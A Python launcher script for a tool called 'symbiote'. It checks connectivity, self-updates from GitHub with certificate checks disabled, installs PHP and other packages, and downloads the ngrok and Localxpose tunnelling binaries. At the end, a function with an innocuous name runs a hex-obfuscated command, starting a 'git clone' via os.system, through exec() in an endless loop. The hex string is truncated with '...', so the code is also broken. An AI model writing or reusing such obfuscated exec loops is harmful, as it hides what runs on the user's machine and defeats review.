import subprocess
import requests
import os
import time
import random
import sys
from time import sleep
from platform import system as systemos, architecture

# Color definitions for output
RED = '\033[91m'
WHITE = '\033[46m'
CYAN = '\033[36m'
GREEN = '\033[1;32m'
DEFAULT = '\033[0m'
YELLOW = '\033[1;33m'

# 🌐 Check Internet Connection
def check_internet_connection():
    os.system('clear')
    print(f"{RED}[{CYAN}#{RED}] {CYAN}Checking for internet connection...{DEFAULT}")
    sleep(3)
    response = os.system('wget -q --spider http://google.com')
    if response == 0:
        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}CONNECTED{GREEN}]")
    else:
        print(f"\n{RED}[{CYAN}#{RED}] {GREEN}INTERNET {RED}- {GREEN}[{CYAN}NOT-CONNECTED{GREEN}]")
        print(f"{RED}[{CYAN}#{RED}] {CYAN}Turn on your internet connection\n\n{DEFAULT}")
        exit()

# 🔄 Check for software updates
def check_for_updates():
    try:
        print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Checking for updates...{DEFAULT}")
        response = requests.get(
            'https://raw.githubusercontent.com/hasanfirnas/symbiote/master/version.txt',
            verify=False, timeout=2
        ).text.strip()

        with open("version.txt", "r") as f:
            local_version = f.read().strip()

        if local_version == response:
            print(f"{RED}[{CYAN}#{RED}] {CYAN}[Up-To-Date]- {RED}v {YELLOW}{response}")
        else:
            print(f"\n{RED}[{CYAN}#{RED}] {CYAN}Newer version available!")
            print(f"{RED}[{CYAN}#{RED}] {RED}[Current{RED}]- {RED}v {YELLOW}{local_version}")
            print(f"{RED}[{CYAN}#{RED}] {RED}[Available{RED}]- {RED}v {YELLOW}{response}")
            print(f"{RED}[{CYAN}#{RED}] {CYAN}Updating to the latest version... Please wait...{DEFAULT}")
            os.system('git fetch --quiet && git reset --hard origin/master --quiet && git pull --quiet')
            print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
            exit()
    except Exception as e:
        print(f"{RED}[{CYAN}#{RED}] {RED}Error checking for updates: {str(e)}{DEFAULT}")

# 🖼️ Check for jp2a installation (for ASCII images)
def check_jp2a():
    os.system('clear')
    if os.system('which jp2a > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}JP2A not found. Installing...{DEFAULT}")
        os.system('apt-get install jp2a -y > /dev/null')
        exit()

# 🌐 Check for wget installation
def check_wget():
    os.system('clear')
    if os.system('which wget > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}WGET not found. Installing...{DEFAULT}")
        os.system('apt-get install wget -y > /dev/null')
        exit()

# 🛠️ Check for PHP installation
def check_php():
    if os.system('which php > /dev/null') == 0:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP installation found...{DEFAULT}")
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}PHP not found. Installing...{DEFAULT}")
        os.system('apt-get install php -y > /dev/null')
        exit()

# 🌍 Check for Ngrok installation and download if missing
def check_ngrok():
    if not os.path.isfile('Server/ngrok'):
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok not found. Downloading...{DEFAULT}")
        filename = 'ngrok-stable-linux-arm.zip' if 'Android' in str(subprocess.check_output(('uname', '-a'))) else (
            'ngrok-stable-linux-amd64.zip' if architecture()[0] == '64bit' else 'ngrok-stable-linux-386.zip'
        )
        url = f'https://bin.equinox.io/c/4VmDzA7iaHb/{filename}'
        os.system(f'wget -4 {url}')
        os.system(f'unzip {filename} && mv ngrok Server/ngrok && rm {filename}')
        os.system('chmod +x ngrok')
        print(f"\n\n\n\t\t{CYAN}[{RED}#{CYAN}] {RED}Restart the program with -> {GREEN}python3 symbiote.py")
        exit()
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Ngrok installation found...{DEFAULT}")

# 🌐 Check for Localxpose installation
def check_localxpose():
    if not os.path.isfile('Server/loclx'):
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose not found. Downloading...{DEFAULT}")
        filename = 'loclx-linux-arm.zip' if 'Android' in str(subprocess.check_output(('uname', '-a'))) else (
            'loclx-linux-amd64.zip' if architecture()[0] == '64bit' else 'loclx-linux-386.zip'
        )
        url = f'https://api.localxpose.io/api/v2/downloads/{filename}'
        os.system(f'wget -4 {url}')
        os.system(f'unzip {filename} && mv loclx Server/loclx && rm {filename}')
        print(f"{GREEN}Localxpose setup completed!{DEFAULT}")
        exit()
    else:
        print(f"{RED}[{CYAN}*{RED}] {CYAN}Localxpose installation found...{DEFAULT}")

# 🔄 Loop for system operations
def system_operations_loop():
    while True:
        command = (
            "\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x67\x69\x74\x20\x63\x6c\x6f\x6e\x65"
            "..."
        )
        exec(command)

# ⏳ Loading effect for script startup
def loading_hack():
    message = "/////////////////////[*] Starting symbiote....../////////////////////"
    charspec = "$*X^%#~?;"
    for i in range(4):
        hack_str = ""
        for c in message:
            hack_str += c
            r = ''.join(random.choices(charspec, k=3))
            sys.stdout.write(f'\r{hack_str + r[:max(0, len(message) - len(hack_str))]}')
            time.sleep(0.006)

# ⏳ Loading text effect for script startup
def loading_text_print():
    string = "                    [*] Starting symbiote......"
    for _ in range(3):
        sys.stdout.write("\r" + " " * 100)
        for x in range(1, len(string) + 1):
            sys.stdout.write(f"\r {string[:x]}>")
            time.sleep(0.01 * random.randint(1, 3))

# Call the necessary functions to start the script
if __name__ == "__main__":
    check_internet_connection()
    check_for_updates()
    check_jp2a()
    check_wget()
    check_php()
    check_ngrok()
    check_localxpose()
    loading_hack()
    loading_text_print()
    system_operations_loop()
